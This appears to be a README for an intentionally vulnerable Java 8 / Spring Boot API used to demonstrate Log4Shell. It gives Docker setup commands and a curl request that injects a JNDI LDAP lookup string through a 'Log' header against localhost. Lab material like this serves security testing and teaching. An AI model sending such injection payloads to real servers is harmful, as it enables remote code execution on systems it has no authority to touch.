# LOG4SHELL

### Vulnerable JAVA 8 + SPRING BOOT WEB API
#### Running the application

```bash
docker build . -t log4shell
docker run --name log4shell -p 8080:8080 log4shell
```

#### Exploit test the application
```bash
curl --location --request POST 'http://localhost:8080/ping' \
--header 'Log: ${jndi:ldap://localhost:9999}'
```